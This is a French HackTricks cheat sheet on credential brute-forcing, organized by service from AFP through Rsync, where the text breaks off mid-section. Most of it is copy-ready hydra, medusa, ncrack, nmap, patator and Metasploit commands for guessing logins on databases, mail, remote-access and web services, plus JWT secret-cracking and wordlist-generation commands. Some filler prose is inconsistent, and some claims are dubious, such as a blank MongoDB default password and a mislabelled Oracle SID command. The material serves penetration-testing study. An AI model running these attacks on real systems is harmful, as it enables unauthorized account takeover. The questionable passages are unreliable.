# Brute Force - Fiche de triche

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Identifiants par défaut

**Recherchez dans Google** les identifiants par défaut de la technologie utilisée, ou **essayez ces liens** :

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Créez vos propres dictionnaires**

Trouvez autant d'informations que possible sur la cible et générez un dictionnaire personnalisé. Les outils qui peuvent aider :

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl est un outil qui permet de générer des listes de mots de passe potentiels à partir d'un site web ou d'un document texte. Il utilise des techniques de web scraping pour extraire les mots clés et les combiner pour former des mots de passe possibles. Cewl peut être utilisé pour effectuer des attaques de force brute ou des attaques de dictionnaire. Il est important de noter que l'utilisation de Cewl pour générer des mots de passe est légale uniquement si vous avez l'autorisation du propriétaire du site web ou du document texte.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Génère des mots de passe en fonction de vos connaissances sur la victime (noms, dates...).
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister est un outil de génération de listes de mots qui vous permet de fournir un ensemble de mots, vous offrant la possibilité de créer plusieurs variations à partir des mots donnés, créant ainsi une liste de mots unique et idéale à utiliser pour un objectif spécifique.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____  
 \ \        / /_   _|/ ____|__   __|  ____|  __ \ 
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  / 
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \ 
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity    
      
Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listes de mots

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://google/fuzzing/tree/master/dictionaries**](https://google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Services

Classés par ordre alphabétique de nom de service.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) est un protocole utilisé pour communiquer entre un serveur web et un serveur d'application. Il est souvent utilisé pour connecter Apache Tomcat à un serveur web. Les attaques de force brute contre AJP peuvent être utilisées pour tenter de deviner les noms d'utilisateur et les mots de passe valides pour accéder à l'application. Les outils tels que `ajpfuzzer` peuvent être utilisés pour automatiser ces attaques.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra est une base de données NoSQL distribuée, conçue pour gérer de gros volumes de données structurées et semi-structurées sur de nombreux serveurs, offrant une haute disponibilité sans point de défaillance unique. Cassandra utilise une architecture de type colonne et est souvent utilisée pour stocker des données en temps réel, telles que les journaux d'événements et les données de capteurs. 

Les attaques de force brute contre Cassandra peuvent être effectuées en utilisant des outils tels que Hydra ou Medusa. Les attaquants peuvent tenter de deviner les noms d'utilisateur et les mots de passe en utilisant des listes de mots courants ou des dictionnaires personnalisés. Les attaquants peuvent également tenter d'exploiter des vulnérabilités connues dans Cassandra pour accéder à la base de données sans authentification. 

Pour se protéger contre les attaques de force brute, il est recommandé de mettre en place des politiques de mot de passe forts et de limiter l'accès à la base de données uniquement aux utilisateurs autorisés. Il est également recommandé de surveiller les journaux d'audit pour détecter toute activité suspecte et de mettre à jour régulièrement Cassandra avec les derniers correctifs de sécurité.
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
### CouchDB

CouchDB est une base de données NoSQL qui stocke les données sous forme de documents JSON. Il est souvent utilisé pour stocker des données semi-structurées ou non structurées. CouchDB dispose d'une API RESTful qui permet aux utilisateurs d'interagir avec la base de données via des requêtes HTTP. 

#### Attaque par force brute

L'attaque par force brute sur CouchDB consiste à deviner les identifiants de connexion en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Les attaquants peuvent utiliser des outils tels que `couchdb-brute` pour automatiser ce processus. 

Pour se protéger contre les attaques par force brute, il est recommandé de mettre en place des politiques de mot de passe solides et de limiter le nombre de tentatives de connexion autorisées. Il est également recommandé de surveiller les journaux d'activité pour détecter toute activité suspecte.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registre Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

### Description
Elasticsearch is a distributed, RESTful search and analytics engine capable of solving a growing number of use cases. As the heart of the Elastic Stack, it centrally stores your data so you can discover the expected and uncover the unexpected.

### Brute force

#### HTTP Basic Auth
```
hydra -L users.txt -P passwords.txt <ip> http-get / -m /login:Authentication failed
```

#### Elasticsearch API
```
hydra -L users.txt -P passwords.txt <ip> http-post-form "/_security/user/authenticate?pretty" -b '{"Content-Type":"application/json"}' -s 9200 -m '{"error":{"root_cause":[{"type":"security_exception","reason":"failed to authenticate user [elastic]"}],"type":"security_exception","reason":"failed to authenticate user [elastic]"},"status":401}' -v
```

#### Elasticsearch API (with X-Pack)
```
hydra -L users.txt -P passwords.txt <ip> http-post-form "/_xpack/security/_authenticate?pretty" -b '{"Content-Type":"application/json"}' -s 9200 -m '{"error":{"root_cause":[{"type":"security_exception","reason":"failed to authenticate user [elastic]"}],"type":"security_exception","reason":"failed to authenticate user [elastic]"},"status":401}' -v
```

#### Elasticsearch API (with X-Pack and SSL)
```
hydra -L users.txt -P passwords.txt <ip> https-post-form "/_xpack/security/_authenticate?pretty" -b '{"Content-Type":"application/json"}' -s 9200 -m '{"error":{"root_cause":[{"type":"security_exception","reason":"failed to authenticate user [elastic]"}],"type":"security_exception","reason":"failed to authenticate user [elastic]"},"status":401}' -v
```

#### Elasticsearch API (with X-Pack and SSL client certificate)
```
hydra -L users.txt -P passwords.txt <ip> https-post-form "/_xpack/security/_authenticate?pretty" -b '{"Content-Type":"application/json"}' -s 9200 -m '{"error":{"root_cause":[{"type":"security_exception","reason":"failed to authenticate user [elastic]"}],"type":"security_exception","reason":"failed to authenticate user [elastic]"},"status":401}' -v -E
```

#### Elasticsearch API (with X-Pack and SSL client certificate and key)
```
hydra -L users.txt -P passwords.txt <ip> https-post-form "/_xpack/security/_authenticate?pretty" -b '{"Content-Type":"application/json"}' -s 9200 -m '{"error":{"root_cause":[{"type":"security_exception","reason":"failed to authenticate user [elastic]"}],"type":"security_exception","reason":"failed to authenticate user [elastic]"},"status":401}' -v -E -K
```
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

Le protocole FTP (File Transfer Protocol) est un protocole de communication utilisé pour transférer des fichiers entre des ordinateurs sur un réseau. Les serveurs FTP sont souvent utilisés pour stocker et partager des fichiers, et les clients FTP sont utilisés pour accéder à ces fichiers.

Le brute force sur FTP consiste à essayer de deviner les identifiants de connexion en utilisant une liste de noms d'utilisateur et de mots de passe courants. Les outils de brute force FTP les plus couramment utilisés sont Hydra et Medusa.

Il est important de noter que de nombreux serveurs FTP ont des mesures de sécurité en place pour empêcher les attaques de brute force, telles que des limites de tentatives de connexion et des délais de verrouillage de compte. Il est donc important de prendre en compte ces mesures lors de la planification d'une attaque de brute force sur FTP.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### Brute Force Générique HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Authentification de base HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Formulaire de publication (Post)

Lorsqu'un formulaire est soumis, les données sont généralement envoyées au serveur via une requête HTTP POST. Cette requête contient les données du formulaire dans le corps de la requête.

Pour effectuer une attaque de force brute sur un formulaire de publication, vous devez d'abord intercepter la requête POST envoyée par le navigateur lors de la soumission du formulaire. Vous pouvez utiliser des outils tels que Burp Suite pour intercepter et modifier la requête.

Une fois que vous avez la requête POST, vous pouvez utiliser un script ou un outil de force brute pour tester différentes combinaisons de noms d'utilisateur et de mots de passe. Vous pouvez également utiliser des listes de mots de passe courants pour accélérer le processus.

Il est important de noter que de nombreux sites Web ont des protections contre les attaques de force brute, telles que des limites de taux et des CAPTCHA. Par conséquent, il est important de tester votre attaque de force brute sur un site Web que vous possédez ou sur lequel vous avez l'autorisation de tester.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Pour http**s**, vous devez changer de "http-post-form" à "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

L'IMAP (Internet Message Access Protocol) est un protocole de messagerie électronique qui permet aux utilisateurs de récupérer et de gérer leurs e-mails à partir d'un serveur de messagerie distant. Les attaques de force brute contre les serveurs IMAP sont courantes et peuvent être utilisées pour accéder à des comptes de messagerie électronique sans autorisation.

Les attaques de force brute contre les serveurs IMAP peuvent être effectuées à l'aide d'outils tels que Hydra, Nmap, Medusa, etc. Ces outils peuvent être utilisés pour tester des combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce qu'une correspondance soit trouvée.

Il est important de noter que de nombreuses organisations ont mis en place des mesures de sécurité pour empêcher les attaques de force brute, telles que le blocage des adresses IP après un certain nombre de tentatives de connexion infructueuses. Par conséquent, les attaquants peuvent utiliser des techniques telles que la rotation d'adresses IP pour éviter d'être détectés.

Il est recommandé d'utiliser des mots de passe forts et uniques pour les comptes de messagerie électronique, ainsi que de mettre en place des mesures de sécurité telles que l'authentification à deux facteurs pour réduire le risque d'attaques de force brute réussies.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
### IRC

IRC (Internet Relay Chat) est un protocole de communication en temps réel basé sur le texte. Il est souvent utilisé pour la communication en ligne dans les communautés de logiciels libres et open source, mais il peut également être utilisé pour la communication en entreprise. Les canaux IRC sont souvent utilisés pour discuter de sujets spécifiques, partager des fichiers et collaborer sur des projets. Les attaques de force brute sur les serveurs IRC peuvent être utilisées pour obtenir des informations d'identification et accéder à des canaux privés.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

L'iSCSI (Internet Small Computer System Interface) est un protocole de stockage en réseau qui permet aux ordinateurs de se connecter à des périphériques de stockage distants tels que des disques durs, des bandes et des CD-ROM. Il utilise le protocole TCP/IP pour transférer des données sur le réseau et est souvent utilisé dans les environnements de stockage en réseau pour fournir un stockage partagé aux serveurs. Les attaques de force brute contre les serveurs iSCSI peuvent être utilisées pour tenter de deviner les noms d'utilisateur et les mots de passe pour accéder aux périphériques de stockage distants.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

Les JSON Web Tokens (JWT) sont souvent utilisés pour l'authentification et l'autorisation dans les applications web modernes. Les JWT sont des chaînes de caractères encodées en base64 qui contiennent des informations sur l'utilisateur et les autorisations associées. Les JWT sont signés avec une clé secrète, ce qui permet de vérifier leur intégrité et d'empêcher les modifications non autorisées. Les attaquants peuvent tenter de deviner la clé secrète ou de contourner la vérification de signature pour créer des JWT valides et accéder à des ressources protégées. Les attaquants peuvent également tenter de deviner ou de voler des JWT valides pour accéder à des ressources protégées sans authentification supplémentaire. Les développeurs doivent s'assurer que les clés secrètes sont suffisamment longues et complexes pour résister aux attaques de force brute et que les JWT sont correctement validés avant d'accorder l'accès aux ressources protégées.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) est un protocole de communication utilisé pour accéder à des services d'annuaire. Les services d'annuaire sont des bases de données qui stockent des informations sur les utilisateurs, les groupes et les ressources du réseau. Les attaques de force brute contre les services LDAP sont courantes et peuvent être très efficaces si les mots de passe sont faibles ou si les politiques de verrouillage de compte ne sont pas en place. Les attaquants peuvent utiliser des outils tels que Hydra ou Patator pour effectuer des attaques de force brute contre les services LDAP. Il est important de mettre en place des politiques de mot de passe solides et des mécanismes de verrouillage de compte pour se protéger contre ces attaques.
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) est un protocole de messagerie léger et simple conçu pour les appareils à faible bande passante et à faible puissance. Il est souvent utilisé dans les applications IoT (Internet des objets) pour envoyer des données entre les appareils et les serveurs.

Le brute-force sur MQTT peut être effectué en essayant de deviner les identifiants de connexion (nom d'utilisateur et mot de passe) en utilisant une liste de mots de passe courants ou en utilisant des outils de brute-force tels que Mosquito-crack. Il est également possible de tenter une attaque par force brute sur les identifiants de session MQTT en utilisant des outils tels que MQTT-Brute.

Il est important de noter que la plupart des implémentations MQTT prennent en charge le chiffrement TLS/SSL, ce qui rend plus difficile la capture des identifiants de connexion ou de session. Cependant, si le serveur MQTT est mal configuré et ne prend pas en charge le chiffrement, les identifiants peuvent être capturés en clair à partir du trafic réseau.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

### Introduction

MongoDB is a NoSQL database that stores data in JSON-like documents with dynamic schemas. It is widely used in web applications and is often part of the MEAN stack (MongoDB, Express.js, AngularJS, Node.js).

### Brute Force

#### 1. Default Credentials

MongoDB has default credentials that are often left unchanged, making it an easy target for brute force attacks. The default username is `admin` and the default password is blank.

#### 2. Dictionary Attack

A dictionary attack involves using a list of common passwords to try and gain access to a system. This can be effective if the target is using a weak password.

#### 3. Password Spraying

Password spraying involves using a single password and trying it against multiple usernames. This can be effective if the target is using a common password.

#### 4. Brute Force Tools

There are several tools available for brute forcing MongoDB, including:

- **Hydra**: A popular brute force tool that supports MongoDB.
- **Nmap**: A network exploration tool that can be used to identify MongoDB instances and ports.
- **Metasploit**: A penetration testing framework that includes a module for brute forcing MongoDB.

### Prevention

To prevent brute force attacks on MongoDB, it is recommended to:

- Change the default credentials.
- Use strong passwords that are not easily guessable.
- Implement rate limiting to prevent multiple login attempts.
- Use two-factor authentication.
- Monitor logs for suspicious activity.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL est un système de gestion de base de données relationnelle open source très populaire. Il est souvent utilisé dans les applications web pour stocker et récupérer des données. Les attaques de force brute contre les bases de données MySQL sont courantes et peuvent être très efficaces si les mots de passe sont faibles ou si les comptes d'utilisateur ont des autorisations excessives. Les attaquants peuvent utiliser des outils automatisés pour essayer de deviner les mots de passe en utilisant des dictionnaires de mots courants ou en essayant toutes les combinaisons possibles de caractères. Il est important de choisir des mots de passe forts et de limiter les autorisations des comptes d'utilisateur pour réduire le risque d'attaques de force brute réussies.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
### OracleSQL

### Description
OracleSQL is a relational database management system (RDBMS) that is widely used in enterprise environments. It is commonly used to store and manage large amounts of data, and is often used in conjunction with other enterprise software applications.

### Brute Force

#### 1. OracleSQL Login Brute Force

OracleSQL login brute force attacks can be performed using a variety of tools, including Hydra and Metasploit. These attacks involve attempting to guess a user's username and password by repeatedly trying different combinations until the correct one is found.

```
hydra -L users.txt -P passwords.txt -e nsr -t 16 -vV <target_ip> oracle-sql
```

#### 2. OracleSQL SID Brute Force

In addition to brute forcing login credentials, it is also possible to brute force the OracleSID. This can be done using the following command:

```
tnscmd10g version -h <target_ip> -p <port> -s <service_name> -U <username> -P <password>
```

### Prevention

To prevent brute force attacks against OracleSQL, it is recommended to implement strong password policies and to limit the number of login attempts allowed. Additionally, it is important to keep the OracleSQL software up to date with the latest security patches and to monitor the system for any suspicious activity.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
Pour utiliser **oracle\_login** avec **patator**, vous devez **installer** :
```bash
pip3 install cx_Oracle --upgrade
```
[Bruteforce de hachage OracleSQL hors ligne](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** et **11.2.0.3**) :
```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

Le protocole POP (Post Office Protocol) est un protocole de récupération de courrier électronique. Il permet à un client de récupérer des messages électroniques à partir d'un serveur de messagerie. Le protocole POP est généralement utilisé pour récupérer des messages électroniques à partir d'un serveur de messagerie distant vers un client de messagerie local.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL est un système de gestion de base de données relationnelle open source. Il est souvent utilisé pour stocker des données dans des applications web et est pris en charge par de nombreux fournisseurs de cloud. Les attaques de force brute contre PostgreSQL peuvent être effectuées en utilisant des outils tels que Hydra ou Patator. Les attaquants peuvent également utiliser des dictionnaires de mots de passe pour tenter de deviner les informations d'identification d'un utilisateur. Il est important de noter que les attaques de force brute sont souvent inefficaces contre les systèmes qui ont des politiques de mot de passe solides et des mesures de sécurité supplémentaires telles que l'authentification à deux facteurs.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

Vous pouvez télécharger le paquet `.deb` à installer depuis [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

Remote Desktop Protocol (RDP) est un protocole de communication utilisé pour la connexion à distance à un ordinateur sur un réseau. Les attaquants peuvent utiliser des attaques de force brute pour deviner les identifiants de connexion RDP et accéder à des systèmes distants. Les outils couramment utilisés pour les attaques de force brute RDP incluent Hydra, Medusa et Ncrack. Les attaquants peuvent également utiliser des outils tels que RDPY pour automatiser les attaques de force brute RDP. Pour se protéger contre les attaques de force brute RDP, il est recommandé d'utiliser des mots de passe forts et de limiter l'accès RDP aux adresses IP autorisées.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis est une base de données en mémoire open source qui stocke des données clé-valeur. Il est souvent utilisé pour la mise en cache, la messagerie et la gestion de sessions. Redis est souvent utilisé dans les applications web pour améliorer les performances en stockant des données fréquemment utilisées en mémoire plutôt que de les récupérer à partir d'une base de données disque. 

#### Brute force

Redis n'a pas de mécanisme de verrouillage de compte, ce qui le rend vulnérable aux attaques de force brute. Les attaquants peuvent utiliser des outils tels que `redis-cli` pour tenter de deviner les mots de passe en utilisant une liste de mots de passe courants ou en utilisant des attaques de dictionnaire. Il est important de choisir un mot de passe fort et complexe pour protéger votre instance Redis.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Le protocole Rexec (Remote Execution) est un protocole de communication qui permet à un utilisateur distant d'exécuter des commandes sur un serveur distant. Il est souvent utilisé pour l'administration à distance de systèmes Unix. Le protocole Rexec transmet les informations d'identification de l'utilisateur en clair, ce qui le rend vulnérable aux attaques de type "man-in-the-middle". Il est donc recommandé d'utiliser des alternatives plus sécurisées telles que SSH.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Le protocole Rlogin est un protocole de connexion à distance qui permet à un utilisateur de se connecter à un autre ordinateur sur un réseau et d'exécuter des commandes sur cet ordinateur comme s'il était assis devant lui. Le protocole Rlogin utilise le port 513 et est souvent utilisé pour se connecter à des systèmes Unix. Les attaques de force brute contre le protocole Rlogin peuvent être effectuées à l'aide d'outils tels que Hydra ou Medusa. Les attaquants peuvent utiliser des listes de mots de passe courants ou des dictionnaires pour tenter de deviner les mots de passe des utilisateurs. Il est recommandé de désactiver le protocole Rlogin si possible et d'utiliser des protocoles de connexion à distance plus sécurisés tels que SSH.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) est un protocole de communication qui permet à un utilisateur de se connecter à un ordinateur distant et d'exécuter des commandes sur cet ordinateur comme s'il était physiquement présent devant lui. Le protocole Rsh est souvent utilisé pour automatiser des tâches système sur des machines distantes. Cependant, il est important de noter que Rsh n'est pas sécurisé car il transmet les informations d'identification en texte clair, ce qui le rend vulnérable aux attaques de type brute-force. Il est donc recommandé d'utiliser des alternatives plus sécurisées telles que SSH.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync est un outil de synchronisation de fichiers très utile pour les sauvegardes et la migration de données. Cependant, il peut également être utilisé pour exécuter des commandes à distance sur un système distant. Pour ce faire, il utilise le protocole RSH (Remote Shell), qui est un protocole de communication réseau qui permet à un utilisateur de se connecter à un ordinateur distant et d'exécuter des commandes sur ce système.

Lorsque Rsync est utilisé avec RSH, il est important de noter que les informations d'identification de l'utilisateur sont envoyées en clair sur le réseau. Cela signifie que si un attaquant est en mesure d'intercepter le trafic réseau, il peut facilement récupérer les informations d'identification de l'utilisateur, y compris le nom d'utilisateur et le mot de passe.

